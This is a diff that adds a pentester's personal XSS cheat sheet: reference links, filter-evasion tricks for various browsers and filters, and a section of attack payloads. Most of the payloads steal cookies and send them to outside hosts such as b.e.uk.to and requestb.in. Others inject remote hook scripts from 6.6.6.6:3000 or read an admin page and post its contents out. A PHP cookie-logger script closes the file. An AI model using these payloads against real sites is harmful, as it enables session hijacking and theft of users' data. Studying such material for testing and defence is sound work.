@@ -1,0 +1,178 @@
+# xss
+
+http://www.xss-payloads.com/ # to checkout next time
+
+https://github.com/jackmasa/XSS.png # mind map
+https://html5sec.org/ https://github.com/cure53/H5SC https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml
+https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29
+
+# test your payloads with
+http://jsfiddle.net/njx5B/3/
+
+# evasion
+https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+~/Documents/papers/favorite_xss_filter_and_bypass.pdf,xss_bypass.txt
+https://soroush.secproject.com/blog/2014/04/how-did-i-bypass-everything-in-modsecurity-evasion-challenge/
+http://sirdarckcat.blogspot.com.au/
+https://www.youtube.com/watch?v=tDjw0cmKS48 "Unusual Web Bugs" by kuza55
+
+# flash
+https://labs.mwrinfosecurity.com/blog/popping-alert1-in-flash/
+http://web.archive.org/web/20130808104241/http:/appsec.ws/FlashExploitDatabase.php
+
+# misc tricks / filter evasion
+<svg/onload=alert(document.domain)>;
+<svg/onload=window.onerror=alert;throw/XSS/;//
+<iframe/onload=action=/confir/.source+'m';eval(action)(1)> 
+
+<body/onload=
+" style="tr:expression(malicious_script)
+
+document['location']='http://3652113177/'+document['cookie'] # sans les caracteres '.' et ' '
+onfocus="alert(0)" autofocus="autofocus" asdf="
+<style>body  > *{display:none;}body:after{font-size:xx-large;content:"this is not how you send people to mars"}</style>
+
+div><img/src="" onerror=alert(0)> // or with src=#
+
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==" alt="Red dot" />
+
+Location: data:text/html;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg== # based64(<script>alert(0)</script>)
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg==">  # ff
+"><x style="x:expression(alert(0)) # ie
+
+<ScRiPt>
+<scrscriptipt> or <scr<script>ipt>
+<<b>script> // ruby strip_tags()
+target=""onload="..." // filter to remove target/onload/... is applied only once (yammer worm)
+%c0%bcscript%c0%bealert ...
+eval(String.fromCharCode(...
+<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')"> // IE, some versions of Safari and others) allow JavaScript in CSS, use the moz-binding CSS property for Gecko-based browsers
+alert(eval('document.body.inne' + 'rHTML'));
+java%0ascript
+prompt(1), confirm(...)
+oninput= onplay= // html5
+<form, oninput=prompt(1)> works too
+charset http://ha.ckers.org/charsets.html
+
+<script src="https://../export.jsp;.html?name=%0D%0AContent-Type:%20text/html%0d%0aLast-Modified:%20Tue,%2015%20Nov%201994%2012:45:26 GMT%0d%0aExpires:%20Tue,%2015%20Nov%202015%2012:45:26%20GMT%0d%0a%0d%0a<script>alert(1)</script>" ></script>
+<iframe src="https://../export.jsp;.html?name=%0D%0AContent-Type:%20text/html%0d%0aLast-Modified:%20Tue,%2015%20Nov%201994%2012:45:26 GMT%0d%0aExpires:%20Tue,%2015%20Nov%202015%2012:45:26%20GMT%0d%0a%0d%0a<script>alert(1)</script>" ></iframe>
+
+exec js in ff when Content-Type: xml
+<a xmlns:a='http://www.w3.org/1999/xhtml'><a:body onload='alert(1)'/>
+
+html-encode : -> &#58; url-encode-> %26%2358%3B
+
+svg
+<svg><use xlink:href="data&#58;image/svg+xml;base64,PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB3aWR0aD0iMTAwIiBoZWl0aHQ9IjEwMCI+CiAgPHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4KICA8Zm9yZWlnbk9iamVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjUwIiByZXF1aXJlZEV4dGVuc2lvbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiPgogIDxlbWJlZCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCIgc3JjPSJqYXZhc2NyaXB0OmFsZXJ0KCd4c3MnKSIgLz4KICA8L2ZvcmVpZ25PYmplY3Q+Cjwvc3ZnPg==#rectangle"></svg>
+or
+<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="1000" height="1000" /></a></svg>
+
+<LINK REL="stylesheet" HREF="https://192.168.122.1:8443/xss.css"> # ie6 OK
+xss.css:
+body {
+  background-image: url('javascript:alert("XSS");')
+}
+
+<audio src=x onerror=prompt(1)>
+
+var a="alert(doc"+"ument..."; eval(a)
+eval(location.hash.substr(1))
+
+* http://www.slideshare.net/codeblue_jp/cb14-masato-kinugawaen
+if you can set encoding in URL (see http://l0.cm/encodings/table/)
+location.href => http://evil%2f@www.youtube.com/
+feed://evil.cm%2f/x.rss%3f@vulnsite.com/
+
+# IE
+* michele orru
+font-family:a/**/ression(alert(1))('\')exp\')
+Works on IE <= 9: <html> <head> </head> <body> <div style="font-family:a/**/ression(alert(666))('\')exp\')">pwn</div> </body> </html>
+Nice for attribute injection, split the first three chars of expression for filter evasion too (there is still the JS function but you can put obfuscated code instead :-)
+Thanks to chinese friends: http://wooyun.org/bugs/wooyun-2014-068564
+By @gainover1
+
+* carlos
+<%foo onmouseover=alert(1)>blah (IE9 allows to define custom tags)
+
+# httponly bypass
+asp.net: the csrf protection is to actually include the session ID is in the ViewState (owasp)
+
+# attack payloads
+<script>document.location="http://x/?c="+document.cookie</script>
+<iframe frameborder=0 height=0 width=0 src=javascript:void(document.location="http://x/?c="+document.cookie)></iframe>
+<script src=//b.e.uk.to/a.js></script>
+<iframe onload='var sc=document.createElement("scr"%2b"ipt");sc.type="text/javascr"%2b"ipt";sc.src="http://6.6.6.6:3000/hook.js";document.body.appendChild(sc);'/>
+<iframe src=//b.e.uk.to /> and index.html: <script src="http://x.x.x.x:3000/hook.js" type="text/javascript"></script>
+<a href="javascript:location='http://x/'%2bdocument.cookie" onclick="">x</a> # google ctf 2016 geokitties trick where waf triggered when there was any non-empty event handler
+<img src=%23 onerror="document.location='http://b.e.uk.to/?c='%2bdocument.cookie">
+<img src=/ onerror=location='http://b.e.uk.to/?c='%2bdocument.cookie>
+new Image().src="http://b.e.uk.to/xss/?"+escape(document.cookie);
+
+<input type="text" onfocus="write(atob('PHNjcmlwdD4KZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwOi8vcmVxdWVzdGIuaW4vMW1sdjYxajE/Y29va2llPSIgKyBkb2N1bWVudC5jb29raWUgKyAiJyAvPiIpOwo8L3NjcmlwdD4='));" autofocus />
+<iframe srcdoc="%26lt%3Bimg%20src%26equals%3Bx%3Ax%20onerror%26equals%3Beval%26lpar%3Batob%26lpar%3B%27ZG9jdW1lbnQubG9jYXRpb249Imh0dHBzOi8vd3d3LnBvdGF0b3BsYS5uZXQveHNzP2Nvb2tpZT0iK2VuY29kZVVSSShkb2N1bWVudC5jb29raWUpOw%3D%3D%27%26rpar%3B%26rpar%3B%26gt%3B (iframe with no closing >)
+
+<img src=x style=display:none onerror=eval(unescape(/xmlhttp%3Dnew%20XMLHttpRequest%28%29%3Bxmlhttp.open%28%22GET%22%2C%22%2fadmin%2fshow.php%22%2Cfalse%29%3Bxmlhttp.send%28%29%3Br%3Dxmlhttp.responseText%3Bxmlhttp.open%28%22POST%22%2C%22http%3A%2f%2frequestb.in%2f17b3o8z1%22%2Ctrue%29%3Bxmlhttp.setRequestHeader%28%22Content-type%22%2C%22application%2fx-www-form-urlencoded%22%29%3Bxmlhttp.send%28r%29%3B/.source));//
+
+try {
+    xmlhttp = new ActiveXObject("MSXML2.XMLHTTP");
+} catch(e) {
+    xmlhttp = new XMLHttpRequest()
+}
+xmlhttp.open("GET","/home?page=infos",false);
+xmlhttp.send(null);
+var info = xmlhttp.responseText;
+var cookie = info.substr(info.indexOf("VIEWSTATE=\"\>0x")+15,10); // change accordingly
+xmlhttp.open("POST","/blah");
+xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+xmlhttp.send("cookie="+cookie);
+
+document.body.appendChild(document.createElement("script")).src="http://6.6.6.6:3000/hook.js"
+
+<script>setTimeout(x,3000);function/**/x(){parent.document.getElementsByTagName{"frame")[4].setAttribute("src","//localhost/index.html");}</script> (injecting in the context of a child frame, so we go back to parent to modify an existing frame)
+
+<script>var c=new XMLHttpRequest();c.open('GET','/');c.setRequestHeader('Range','bytes=18-18446744073709551615');c.send();</script>
+
+# bypass Content-Disposition: attachment
+see "Unusual Web Bugs"
+* works on my w2k3 IE8
+http://www.awgh.org/archives/57 (CVE-2009-1140 / MS09-019)
+upload: <html><head><title>XSS Test Page</title><script>alert(document.cookie);</script></head><body><code>alert(document.cookie);</code></body></html>
+
+* unclear how it works:
+http://sirdarckcat.blogspot.com.au/2007/12/bypassing-content-disposition.html
+
+# IE content sniffing / MIME-type confusion
+http://blog.detectify.com/post/53925159976/how-to-avoid-ie-content-sniffing-xss-attacks 
+upload test.qwefhj: <html><body><script>alert(document.cookie)</script></body></html>
+fix: "X-Content-Type-Options: nosniff" header (http://msdn.microsoft.com/en-us/library/ie/gg622941%28v=vs.85%29.aspx)
+http://msdn.microsoft.com/en-us/library/ms775147.aspx
+
+works in old IE or if compatibility view is turned on
+
+# cookie logger
+<?php
+$data = "=== REQUEST FROM [".$_SERVER['REMOTE_ADDR']."] ";
+$data .= "-> ".date("Y-m-d : H:i:s")."\n";
+$data .= "GET:\n".var_export($_GET, true)."\n";
+$data .= "POST:\n".var_export($_POST, true)."\n";
+$data .= "COOKIE:\n".var_export($_COOKIE, true)."\n";
+$data .= "SERVER:\n".var_export($_SERVER, true)."\n\n";
+
+file_put_contents("log.txt", $data, FILE_APPEND);
+?>
+
+# IIS filter bypass
+https://blog.whitehatsec.com/internet-explorer-xss-filter/
+http://www.quotium.com/research/advisories/XSS-NetRequestValidation.php
+http://www.jardinesoftware.net/2012/08/29/another-request-validation-bypass/ (same post?)
+
+# XSS Auditor bypass
+http://www.thespanner.co.uk/2015/02/19/another-xss-auditor-bypass/
+
+# CSP tricks
+https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22
+
+# length restriction bypasses
+convert to domxss: <script>eval(location.hash.substr(1))</script>
+span an attack payload across multiple fields (twahh p.412)
+
